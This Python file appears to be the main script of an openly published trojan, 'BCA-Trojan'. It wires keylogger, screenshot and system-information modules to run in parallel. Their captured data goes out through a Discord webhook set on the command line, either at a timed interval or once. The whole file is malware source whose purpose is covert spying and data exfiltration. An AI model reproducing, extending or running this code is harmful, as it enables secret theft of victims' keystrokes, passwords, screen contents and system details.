#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import platform
from concurrent.futures import ThreadPoolExecutor
from uuid import uuid4

from src.modules.exfiltration import Discord
from src.modules.exploitation import KeyLogger, ScreenShot, SystemInformation


class Trojan:
    def __init__(self, *, exfil_time: float, webhook: str):
        """Set up a Trojan composed of exploitation and exfiltration
        modules.

        :param exfil_time: Time in seconds to wait between periodic
            executions of the exfiltration of logged data. Set to
            None to perform a single operation.
        :param webhook: URL to the Webhook set up on the Discord
            server's configuration.
        """
        self.exfil_time = exfil_time
        self.webhook = webhook

    @property
    def screenshot_path(self) -> str:
        filename = f"{str(uuid4())}.jpeg"
        if platform.system() == "Windows":
            app_data = os.path.expandvars(r"%LOCALAPPDATA%")
            path = os.path.join(app_data, "Temp", filename)
        else:  # Linux/Unix/MacOS
            path = f"/tmp/{filename}"
        return path

    @property
    def modules(self) -> set:
        return {
            KeyLogger(exfil_time=self.exfil_time),
            ScreenShot(exfil_time=self.exfil_time,
                       image_path=self.screenshot_path),
            SystemInformation()
        }

    def execute(self):
        with ThreadPoolExecutor() as executor:
            for module in self.modules:
                Discord(module=module, webhook_url=self.webhook)
                executor.submit(module.execute)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--webhook",
                        type=str,
                        required=True)
    parser.add_argument("-e", "--exfil-time",
                        type=float,
                        required=True)
    _args = parser.parse_args()

    Trojan(exfil_time=_args.exfil_time, webhook=_args.webhook).execute()
